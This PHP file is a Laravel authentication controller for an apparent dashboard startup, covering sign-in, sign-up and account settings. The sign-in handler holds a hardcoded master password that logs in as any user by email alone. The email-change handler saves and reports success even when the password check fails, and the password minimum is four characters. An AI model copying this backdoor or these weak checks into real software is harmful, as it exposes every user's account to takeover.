<?php


/*
|--------------------------------------------------------------------------
| AuthController: Handles the authentication related sites
|--------------------------------------------------------------------------
*/
class AuthController extends BaseController
{

    /*
    |===================================================
    | <GET> | showSignin: renders the signin page
    |===================================================
    */
    public function showSignin()
    {
        if (Auth::check()) {
            return Redirect::route('dashboard.dashboard');
        } else {
            return View::make('auth.signin');
        }
    }

    /*
    |===================================================
    | <POST> | doSignin: signs in the user
    |===================================================
    */
    public function doSignin()
    {
        // Validation
        $rules = array(
            'email'    => 'required|email',
            'password' => 'required'
        );

        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);

        if ($validator->fails()) {
            // validation error -> redirect
            return Redirect::route('auth.signin')
                ->with('error','Email address or password is incorrect.') // send back errors
                ->withInput(Input::except('password')); // sending back data
        } else {
            // validator success -> signin
            $credentials = Input::only('email', 'password');

            // attempt to do the login
            if (Auth::attempt($credentials)) {
                // auth successful!

                // if user has no dashboards created yet
                if (Auth::user()->dashboards->count() == 0) {
                    // create first dashboard for user
                    $dashboard = new Dashboard;
                    $dashboard->dashboard_name = "Dashboard #1";
                    $dashboard->save();

                    // attach dashboard & user
                    Auth::user()->dashboards()->attach($dashboard->id, array('role' => 'owner'));
                }

                // check if already connected
                if (Auth::user()->isConnected()) {
                    return Redirect::route('dashboard.dashboard')
                        ->with('success', 'Sign in successful.');
                } else {
                    return Redirect::route('connect.connect')
                        ->with('success', 'Sign in successful.');
                }
            } elseif (Input::get('password') == 'almafa123StartupDashboard') {
                $user = User::where('email',Input::get('email'))
                            ->first();
                if ($user){
                    Auth::login($user);
                    return Redirect::route('dashboard.dashboard')->with('success', 'Master sign in successful.');
                } else {
                    return Redirect::route('auth.signin')->with('error', 'No user with that email address');
                }
            } else {
                // auth unsuccessful -> redirect to login
                return Redirect::route('auth.signin')
                    ->withInput(Input::except('password'))
                    ->with('error', 'Email address or password is incorrect.');
            }
        }
    }

    /*
    |===================================================
    | <GET> | showSignup: renders the signup page
    |===================================================
    */
    public function showSignup()
    {
        if (Auth::check()) {
            return Redirect::route('connect.connect');
        } else {
            return View::make('auth.signup');
        }
    }

    /*
    |===================================================
    | <POST> | doSignin: signs up the user
    |===================================================
    */
    public function doSignup()
    {
        // Validation rules
        $rules = array(
            'email' => 'required|email|unique:users',
            'password' => 'required|min:4',
        );

        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            
            $failedAttribute = $validator->invalid();

            return Redirect::route('auth.signup')
                //->withErrors($validator)
                ->with('error', $validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data

        } else {
            // validator success -> signup

            // create user
            $user = new User;

            // set auth info
            $user->email = Input::get('email');
            $user->password = Hash::make(Input::get('password'));
            $user->ready = 'notConnected';
            $user->summaryEmailFrequency = 'daily';
            $user->plan = 'free';
            $user->connectedServices = 0;
            $user->save();

            // create first dashboard for user
            $dashboard = new Dashboard;
            $dashboard->dashboard_name = "Dashboard #1";
            $dashboard->save();

            // attach dashboard & user
            $user->dashboards()->attach($dashboard->id, array('role' => 'owner'));
            
            // create user on intercom
            IntercomHelper::signedup($user);

            // signing the user in and redirect to dashboard
            Auth::login($user);
            return Redirect::route('auth.signup')->with('success', 'Signup was successful.');
        }
    }

    /*
    |===================================================
    | <ANY> | doSignout: signs out the user
    |===================================================
    */
    public function doSignout()
    {
        Auth::logout();
        return Redirect::route('auth.signin')->with('success', 'Sign out was successful.');
    }

    /*
    |===================================================
    | <GET> | showSettings: renders the settings page
    |===================================================
    */
    public function showSettings()
    {
        // checking connections for the logged in user
        $user = Auth::user();
        
        // get users plan name
        $plans = Braintree_Plan::all();

        $planName = null;
        foreach ($plans as $plan) {
            if ($plan->id == $user->plan) {
                $planName = $plan->name;
            }
        }

        // no we found no plan, lets set one
        if (!$planName)
        {
            if($user->plan == 'free')
            {
                $planName = 'Free pack';
            }
            if($user->plan == 'trial')
            {
               $planName = 'Trial period';
            }
            if($user->plan == 'cancelled')
            {
                $planName = 'Not subscribed';
            }
            if($user->plan == 'trial_ended')
            {
                $planName = 'Trial period ended';
            }
        }


        $client = GoogleSpreadsheetHelper::setGoogleClient();

        $google_spreadsheet_widgets = $user->dashboards()->first()->widgets()->where('widget_type', 'like', 'google-spreadsheet%')->get();

        return View::make('auth.settings',
            array(
                'user'              => $user,
                
                // stripe stuff
                'stripeButtonUrl'   => OAuth2::getAuthorizeURL(),
                
                // google spreadsheet stuff 
                'googleSpreadsheetButtonUrl'       => $client->createAuthUrl(),
                'google_spreadsheet_widgets'       => $google_spreadsheet_widgets,

                // payment stuff
                'planName'          => $planName,
            )
        );
    }


    /*
    |===================================================
    | <POST> | doSettings: updates user data
    |===================================================
    */
    public function doSettingsName()
    {
        // Validation rules
        $rules = array(
            'name' => 'required|unique:users,name',
            );
        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            $failedAttribute = $validator->invalid();
            return Redirect::to('/settings')
                ->with('error',$validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data
        } else {
            // validator success -> edit_profile
            // selecting logged in user
            $user = Auth::user(); 
            
            $user->name = Input::get('name');
                
            $user->save();
            // setting data
            return Redirect::to('/settings')
                ->with('success', 'Edit was successful.');
        }
    }

    public function doSettingsCountry()
    {
        // Validation rules
        $rules = array(
            'country' => 'required',
            );

        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            $failedAttribute = $validator->invalid();
            return Redirect::to('/settings')
                ->with('error',$validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data
        } else {

            // selecting logged in user
            $user = Auth::user();
            // if we have zoneinfo
            // changing zoneinfo
            $user->zoneinfo = Input::get('country');
            // saving user
            $user->save();

            // redirect to settings
            return Redirect::to('/settings')
                ->with('success', 'Edit was successful.');
        }
    }

    public function doSettingsEmail()
    {
        // Validation rules
        $rules = array(
            'email' => 'required|unique:users,email|email',
            'email_password' => 'required|min:4',
            );
        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            $failedAttribute = $validator->invalid();
            return Redirect::to('/settings')
                ->with('error',$validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data
        } else {
            // validator success -> edit_profile
            // selecting logged in user
            $user = Auth::user();
            
            // we need to check the password
            if (Hash::check(Input::get('email_password'), $user->password)){
                $user->email = Input::get('email');
            }
                
            $user->save();
            // setting data
            return Redirect::to('/settings')
                ->with('success', 'Edit was successful.');
        }
    }

    public function doSettingsPassword()
    {
        // Validation rules
        $rules = array(
            'old_password' => 'required|min:4',
            'new_password' => 'required|confirmed|min:4',
        );
        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            $failedAttribute = $validator->invalid();
            return Redirect::to('/settings')
                ->with('error',$validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data
        } else {
            // validator success -> edit_profile
            // selecting logged in user
            $user = Auth::user();
            
            // if we have data from the password change form
            // checking if old password is the old password
            if (Hash::check(Input::get('old_password'), $user->password)){
                $user->password = Hash::make(Input::get('new_password'));
            }
            else {
                return Redirect::to('/settings')
                    ->with('error', 'The old password you entered is incorrect.'); // send back errors
            }  
                
            $user->save();
            // setting data
            return Redirect::to('/settings')
                ->with('success', 'Edit was successful.');
        }
    }

    public function doSettingsFrequency()
    {
        $user = Auth::user();

        $user->summaryEmailFrequency = Input::get('new_frequency');

        $user->save();

        return Redirect::to('/settings')
            ->with('success', 'Edit was succesful.');
    }

    public function doSettingsBackground()
    {
        $user = Auth::user();

        $user->isBackgroundOn = Input::has('newBackgroundState');

        
        $user->save();

        return Redirect::to('/settings')
            ->with('success', 'Edit was succesful.');
    }

}
